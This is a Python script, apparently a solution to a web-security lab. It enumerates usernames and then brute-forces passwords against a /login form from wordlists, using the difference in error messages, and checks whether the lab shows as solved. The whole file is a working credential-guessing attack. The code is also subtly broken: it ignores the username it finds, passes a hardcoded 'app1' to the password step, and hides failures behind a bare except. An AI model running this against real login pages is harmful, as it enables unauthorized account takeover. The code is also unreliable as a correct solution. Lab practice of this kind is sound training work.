import requests
import re
import os

def get_username(session, domain, wordlist):
    with open(wordlist, 'r') as f:
        for username in f.readlines():
            username = username.strip()
            payload = {'username': username, 'password': 'test'}
            print('Trying username: ', username)
            r = session.post(domain + '/login', data=payload)
            if 'Invalid username or password.' not in r.text:
                return username
def login(session, domain, username, wordlist):
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            payload = {'username': username, 'password': password}
            print('Trying Credentials: ', payload)
            r = session.post(domain + '/login', data=payload)
            if ('Invalid username or password' not in r.text):
                print('Found Credentials: ', payload)
                break
def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    session = requests.Session()
    try:
        path = os.path.dirname(os.path.abspath(__file__))
        print(path)
        username = get_username(session, domain, os.path.join(path, 'userlist.txt'))
        login(session, domain, 'app1', os.path.join(path, 'passwordlist.txt'))
        verify(session, domain)
    except requests.exceptions.ConnectionError:
        print('Connection Error. Please check your network connection.')
    except:
        print('Something went wrong. Please try again.')